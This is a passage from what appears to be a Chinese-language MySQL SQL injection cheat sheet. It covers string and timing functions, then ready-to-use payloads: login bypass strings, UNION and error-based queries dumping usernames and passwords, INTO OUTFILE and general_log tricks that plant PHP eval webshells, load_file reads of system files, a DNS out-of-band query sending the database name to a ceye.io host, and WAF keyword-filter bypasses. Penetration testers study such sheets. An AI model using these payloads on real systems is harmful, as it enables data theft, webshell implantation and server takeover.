</code></pre></div><ul><li>字符串连接函数</li></ul><p><code>concat</code> <code>concat_ws</code> <code>group_concat</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">&#39;\n&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>字符串操作函数</li></ul><p><code>substr</code> <code>mid</code> <code>left</code> <code>right</code> <code>locate</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># substr(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度；limit表示从记录中第n个开始（n&gt;=0)，取m条记录</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># mid(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度</span>
<span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># left(str,len)，str--&gt;字符串，len--&gt;长度，从左开始截取长度为len的字符串</span>
<span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># right(str,len)，str--&gt;字符串，len--&gt;长度，从右开始截取长度为len的字符串</span>
<span class="token keyword">select</span> locate<span class="token punctuation">(</span><span class="token string">&#39;security&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;1234security&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 返回第一个字符串在第二个字符串首次出现的位置</span>
<span class="token keyword">select</span> strcmp<span class="token punctuation">(</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 比较两个字符串是否相等，相等返回0，str1&gt;str2返回1，str1&lt;str2返回-1</span>
</code></pre></div><ul><li>返回指定 ASCII 字符对应的值</li></ul><p><code>ascii</code> <code>ord</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> ord<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>返回指定数字对应的 ASCII 码</li></ul><p><code>char</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>计算相关</li></ul><p><code>length</code> <code>count</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 计算数据库名长度</span>
<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>时间相关</li></ul><p><code>sleep</code> <code>if</code> <code>benchmark</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 睡眠5秒</span>
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>locate<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># if(expr1,expr2,expr3)</span>
<span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span>sha<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式</span>
<span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">&#39;test&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间</span>
</code></pre></div><ul><li>注释方法</li></ul><p><code>#</code> <code>--+</code> <code>/* */</code> <code>/*! */</code> <code>/*!50000 */</code> mysql5 通用 带版本内联注释</p><h2 id="注入语句" tabindex="-1"><a class="header-anchor" href="#注入语句" aria-hidden="true">#</a> 注入语句</h2><h3 id="万能密码" tabindex="-1"><a class="header-anchor" href="#万能密码" aria-hidden="true">#</a> 万能密码</h3><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span>&#39;a
</code></pre></div><h3 id="union注入" tabindex="-1"><a class="header-anchor" href="#union注入" aria-hidden="true">#</a> UNION注入</h3><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;users&#39;</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>获取字段对应的值</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><h3 id="报错注入" tabindex="-1"><a class="header-anchor" href="#报错注入" aria-hidden="true">#</a> 报错注入</h3><h4 id="updataxml" tabindex="-1"><a class="header-anchor" href="#updataxml" aria-hidden="true">#</a> updataxml：</h4><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>UPDATEXML <span class="token punctuation">(</span>XML_document<span class="token punctuation">,</span> XPath_string<span class="token punctuation">,</span> new_value<span class="token punctuation">)</span> 改变文档中符合条件的节点的值。
XML_document：String格式，为XML文档对象的名称。
XPath_string ：Xpath格式的字符串。
new_value：String格式，替换查找到的符合条件的数据。
</code></pre></div><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ </span>
</code></pre></div><h4 id="extractvalue" tabindex="-1"><a class="header-anchor" href="#extractvalue" aria-hidden="true">#</a> extractvalue：</h4><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>Extractvalue<span class="token punctuation">(</span>xml_frag<span class="token punctuation">,</span> xpath_expr<span class="token punctuation">)</span> 函数使用XPath表示法从XML字符串中提取值。
xml_frag: 目标xml文档。
xpath_expr: 利用Xpath路径法表示的查找路径。
</code></pre></div><ul><li>获取表名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ul><li>获取字段名</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+ </span>
</code></pre></div><h4 id="floor" tabindex="-1"><a class="header-anchor" href="#floor" aria-hidden="true">#</a> floor：</h4><blockquote><p>floor(x) 函数，向下取整,返回一个不大于 x 的值。</p></blockquote><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><h3 id="写文件" tabindex="-1"><a class="header-anchor" href="#写文件" aria-hidden="true">#</a> 写文件</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;?php @eval($_GET[x]);?&gt;&quot;</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:/Inetpub/wwwroot/cc.php&#39;</span>
</code></pre></div><h3 id="读文件" tabindex="-1"><a class="header-anchor" href="#读文件" aria-hidden="true">#</a> 读文件</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> mysql.ini 中 secure_file_pri 为空，（在 Linux 下为 my.cnf，目录是<code>/etc/my.cnf</code>）。</li></ul><p>读取 <code>secure_file_priv</code> 配置：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">&quot;secure_file_priv&quot;</span>
</code></pre></div><table><thead><tr><th style="text-align:left;">值</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>null</code></td><td style="text-align:left;">不允许导入导出</td></tr><tr><td style="text-align:left;"><code>/tmp</code></td><td style="text-align:left;">只能在/tmp目录下导入导出</td></tr><tr><td style="text-align:left;"><code>空</code></td><td style="text-align:left;">允许导入导出</td></tr></tbody></table><p>写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">&#39;c:\\window\\win.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;c:/boot.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token number">0x633a2f626f6f742e696e69</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;//ecma.io/1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># smb 协议。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;\\\\ecma.io\\1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># 可用于 DNS 隧道。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 &#39;/&#39;。</span>
</code></pre></div><h3 id="写一句话木马" tabindex="-1"><a class="header-anchor" href="#写一句话木马" aria-hidden="true">#</a> 写一句话木马</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&quot;E\\phpStudy\\PHPTutoral\\www\\1.php&quot;</span> <span class="token comment">--+</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&quot;E\\phpStudy\\PHPTutoral\\www\\1.php&quot;</span> <span class="token comment">--+</span>
</code></pre></div><p><em>outfile</em>和<em>dumpfile</em>的区别：</p><p><code>outfile</code> 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \n 等字符,会自动转义成 \n,也就是会多加一个 \。outfile 函数可以导出多行，而 <code>dumpfile</code> 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。</p><h3 id="堆叠注入写木马" tabindex="-1"><a class="header-anchor" href="#堆叠注入写木马" aria-hidden="true">#</a> 堆叠注入写木马</h3><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token comment"># 主要利用 mysql 日志来写 shell。</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">&quot;ON&quot;</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">&#39;C:/wamp64/www/ma.php&#39;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="dnslog外带查询" tabindex="-1"><a class="header-anchor" href="#dnslog外带查询" aria-hidden="true">#</a> DNSlog外带查询</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> root 权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> mysql.ini 中 secure_file_priv 必须为空。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Windows 系统。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">&#39;\\\\&#39;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.27epx0.ceye.io\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ # 使用 Windows 下的 UNC 路径。</span>
</code></pre></div><p>相应的更换<code>select database()</code>查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。</p><h2 id="绕过语句" tabindex="-1"><a class="header-anchor" href="#绕过语句" aria-hidden="true">#</a> 绕过语句</h2><ul><li>大小写。</li><li>双写关键字。</li><li>URL 编码。</li><li>内联注释。</li><li>等价函数替换。</li><li>分块传输。</li><li>遇到云 WAF，寻找真实 IP。</li><li><code>%0a</code>。</li><li><code>between a and b</code>。</li><li>缓冲区溢出。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span>  <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">Select</span> <span class="token number">0xA</span>\<span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">uNiOn</span> <span class="token keyword">SeLeCt</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>HEX编码</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>unhex<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>关键词过滤</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span>
可能正则: preg_match<span class="token punctuation">(</span><span class="token string">&#39;/(and|or|union)/i&#39;</span><span class="token punctuation">,</span> $id<span class="token punctuation">)</span>
被拦截的语句: <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span> password <span class="token keyword">from</span> users
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token keyword">group</span> <span class="token keyword">by</span> user_id <span class="token keyword">having</span> user_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users <span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>

过滤关键词: <span class="token operator">and</span><span class="token punctuation">,</span> <span class="token operator">or</span><span class="token punctuation">,</span> <span class="token keyword">union</span><span class="token punctuation">,</span> <span class="token keyword">where</span><span class="token punctuation">,</span> <span class="token keyword">limit</span><span class="token punctuation">,</span> <span class="token keyword">group</span> <span class="token keyword">by</span><span class="token punctuation">,</span> <span class="token keyword">select</span>
被拦截的语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>gruop_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">user</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
bypass语句: <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;result.txt&#39;</span>
